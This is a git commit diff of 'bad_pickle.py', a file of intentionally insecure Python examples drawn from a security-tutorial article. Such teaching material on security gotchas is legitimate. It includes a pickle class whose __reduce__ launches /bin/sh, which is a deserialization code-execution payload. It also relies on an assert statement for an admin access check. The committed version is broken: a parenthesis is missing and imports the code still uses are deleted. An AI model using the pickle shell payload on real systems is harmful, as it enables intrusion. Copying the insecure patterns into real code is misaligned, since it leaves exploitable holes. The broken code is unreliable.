508c8536b2ded557eb73e42f1bbec92f3b24ffd5
xvitkov <84027433+xvitkov@users.noreply.github.com>
2021-05-11 16:53:31 +0200

    Add files via upload

--- bad_pickle.py
+++ bad_pickle.py
@@ -1,10 +1,8 @@
 # contains bunch of buggy examples
-# taken from https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03
-import cPickle
-import subprocess
-import base64
-import subprocess
+# taken from https://hackernoon.com/10-common-security-gotchas-in-python
+# -and-how-to-avoid-them-e19fbe265e03
 
+import subprocess
 
 # Input injection
 def transcode_file(request, filename):
@@ -13,15 +11,14 @@ def transcode_file(request, filename):
 
 
 # Assert statements
-def foo(request, user):
-   assert user.is_admin, 'user does not have access'
-   # secure code...
+def access_function(request, user):
+    assert user.is_admin, 'user does not have access'
+    # secure code...
 
 
 # Pickles
-class RunBinSh(object):
-  def __reduce__(self):
-    return (subprocess.Popen, (('/bin/sh',),))
-
+class RunBinSh():
+    def __reduce__(self):
+        return (subprocess.Popen, ('/bin/sh')
 
 print(base64.b64encode(cPickle.dumps(RunBinSh())))
